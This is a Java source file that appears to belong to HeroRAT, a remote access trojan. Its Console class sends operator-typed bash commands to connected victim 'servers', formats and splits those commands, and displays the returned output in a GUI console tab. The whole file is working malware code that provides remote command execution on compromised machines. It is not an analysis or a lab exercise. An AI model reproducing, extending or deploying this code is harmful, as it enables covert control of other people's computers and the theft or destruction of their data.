package net.herorat.features.console;

import net.herorat.Main;
import net.herorat.features.servers.Server;
import net.herorat.network.Network;
import net.herorat.network.Packet;
import net.herorat.network.Packet2Console;


public class Console
{
	public static void send(Server server, String command)
	{
		Packet p = new Packet2Console(server.outputstream, new String[] { "bash", formatCmd(command) });
		p.write();
	}

	public static void handle(Server server, String[] args)
	{
		if (!server.equals(Network.findWithCombo(Main.mainWindow.panel_tab5.combo_selected_item))) return;
		
		if (args.length > 0)
		{
			StringBuffer buffer = new StringBuffer();
			for (String arg : args)
			{
				buffer.append(arg);
			}
			
			server.buffer_console.append(buffer.toString() + "\n");
			Main.mainWindow.panel_tab5.area_console.setText(server.buffer_console.toString());
		}
	}
	
	public static String[] split(String command)
	{
		String[] splitted_quote = command.split("\"");
		String[] splitted_subcommand;
		String[] splitted_command = new String[64];
		
		if (splitted_quote.length >= 3)
		{
			int index = 0;
			for (int i=0; i<splitted_quote.length; i+=2)
			{
				splitted_subcommand = splitted_quote[i].split(" ");
				for (String subcommand : splitted_subcommand)
				{
					splitted_command[index] = subcommand;
					index ++;
				}
				if ( (i+1) < splitted_quote.length )
				{
					splitted_command[index] = "\""+ splitted_quote[i+1] +"\"";
					index ++;
				}
			}
			return splitted_command;
		}
		
		return new String[] {command};
	}
	
	public static String formatCmd(String command)
	{
		String[] splitted_command = split(command);
		
		StringBuffer buffer = new StringBuffer();
		for (String sub : splitted_command)
		{
			if (sub != null && !sub.equals(""))
			{
				if (buffer.length() != 0) buffer.append("###");
				buffer.append(sub);
			}
		}
		
		return buffer.toString();
	}
}